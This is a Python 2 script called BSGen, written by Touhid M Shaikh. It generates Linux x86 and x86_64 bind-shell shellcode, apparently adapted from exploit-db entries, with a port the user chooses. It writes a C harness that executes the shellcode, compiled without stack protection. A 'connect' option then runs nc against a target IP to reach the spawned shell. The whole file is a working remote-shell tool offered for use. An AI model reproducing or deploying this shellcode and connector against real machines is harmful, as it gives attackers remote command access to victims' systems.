#!/usr/bin/python
# -*- coding: utf-8 -*-

# Author : Touhid M Shaikh
# Website : http://www.touhidshaikh.com
# Description :
# Date : 25 Aug, 2017
# Version : 1.0
# Alias : BSGen (Blind Shell Genrator)

import subprocess
from prettytable import PrettyTable


port = 4422;arch = "x86"

def banner():
        banner = """
 /#######   /######   /######                     
| ##__  ## /##__  ## /##__  ##                    
| ##  \ ##| ##  \__/| ##  \__/  /######  /####### 
| ####### |  ###### | ## /#### /##__  ##| ##__  ##
| ##__  ## \____  ##| ##|_  ##| ########| ##  \ ##
| ##  \ ## /##  \ ##| ##  \ ##| ##_____/| ##  | ##
| #######/|  ######/|  ######/|  #######| ##  | ##
|_______/  \______/  \______/  \_______/|__/  |__/

        """
        return banner


def cfile(temp,arch):
    temp = temp
    name = 'shell_'+arch+'.c'
    f = open(name,"w")
    ctemp = """#include<stdio.h>
#include<string.h>

/* Thank You for Using BSGen By Touhid M.Shaikh(@touhidshaikh22)*/

/*Compile : gcc -fno-stack-protector -z execstack shell_[x86/x86_64].c -o shell-testing */
unsigned char code[] = \\
\""""+temp+"""";
 
main(){

printf("Shellcode Length:  %d\\n", (int)strlen(code));

int (*ret)() = (int(*)())code;
ret();
}"""

    f.write(ctemp)
    f.close()
    print "Created Filename: ",name

    return

def port2hex(port):
    porthex = hex(port)[2::]
    port = ""
    f = 0; l = 2
    for i in range(0,len(porthex),2):
        port += "\\x"+porthex[f:l]
        f += 2; l += 2
    return port

def shellx86(port,arch):
    #https://www.exploit-db.com/exploits/42254/
    temx86 = r"\x6a\x66\x58\x99\x53\x43\x53\x6a\x02\x89\xe1\xcd\x80\x5b\x5e\x52"
    temx86 += r"\x66\x68"+port+r"\x52\x6a\x02\x6a\x10\x51\x50\x89\xe1\xb0\x66\xcd"
    temx86 += r"\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93"
    temx86 += r"\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x2f\x2f\x73\x68\x68\x2f\x62"
    temx86 += r"\x69\x6e\x89\xe3\x50\x89\xe1\xb0\x0b\xcd\x80"
    cfile(temx86,arch)

    return


def shellx86_64(port,arch):
    # https://www.exploit-db.com/exploits/39684/
    temx86_64 = r"\x99\x6a\x29\x58\x6a\x01\x5e\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02" \
                r"\x66\xc7\x44\x24\x02"
    temx86_64 += port
    temx86_64 += r"\x54\x5e\x52\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x50\x5e\x6a\x32\x58" \
                 r"\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a" \
                 r"\x21\x58\x0f\x05\x75\xf6\x99\x52\x48\xb9\x2f\x62\x69\x6e\x2f\x2f" \
                 r"\x73\x68\x51\x54\x5f\x6a\x3b\x58\x0f\x05"
    cfile(temx86_64,arch)

    return
try:
    print banner()
    while True:
        cmd = raw_input("\033[1;32;40mBSGex >> \033[0m")
        cmd = cmd.strip()
        if (cmd.lower() == 'exit') or (cmd.lower() == 'quit'):
            print "Exited"
            break

        if cmd == "set port":
            try:
                port = input("Port[Default:4422] : ")
                if (port < 1024) or (port > 65535):
                    print "Plzz. Specify Port Between 1024-65535"
                    continue
            except SyntaxError:
                port = 4422
                continue

        if cmd == "set platform":
            arch = raw_input("Platform[Default:x86] : ")
            if not arch:
                arch = "x86"
            if (arch != "x86") and (arch != "x86_64"):
                print "Plz. Specified X86 or x86_64"
                print "Default Platform Set"
                arch = "x86"
                continue
        if cmd == "make shell":
            if (port == '') or (arch == ''):
                print "Check your port or Platform"
                continue
            elif (arch == "x86") or (arch == "x86_64"):
                    port = port2hex(port)
                    if arch == "x86":
                        shellx86(port,arch)
                    else:
                        shellx86_64(port,arch)
            else:
                print "Something Goes Wrong !!"
                break
        if cmd == "connect":
            ip = raw_input("Enter Target IP : ")
            if not ip:
               print "Plz enter valid IP address"
               continue
            try:
                p = input("Port[Default:4422] : ")
                if (p < 1024) or (p > 65535):
                    print "Plzz. Specify Port Between 1024-65535"
                    continue
            except SyntaxError:
                p = 4422
                continue
            try:
                cmmand = "nc "+ip+" "+str(p)
                subprocess.call(cmmand, shell=True)
            except:
                print "AHHHHHHHHH ! Error "
        if cmd == "help":
            print "Command For Shellcode Options : "
            t = PrettyTable(['Command', 'Value','Description'])
            t.add_row(['set port', port,"Set port between 1024 to 65535"])
            t.add_row(['set platform', arch,"Enter Target Platform [x86/x86_64]"])
            print t
            print "\n For Other Commends : "
            p = PrettyTable(['Command','Description'])
            p.add_row(['make shell',"Your Shell will be genrated in Current Dir"])
            p.add_row(['connect',"Make sure your shellcode run on your target system"])
            print p
            print "\n Feedback : https://github.com/touhidshaikh"
            print " Twitter : https://twitter.com/touhidshaikh22"
except KeyboardInterrupt:
    print "\nUser Exited "
except :
    print "AHHHHHhhh! Something Wrong"
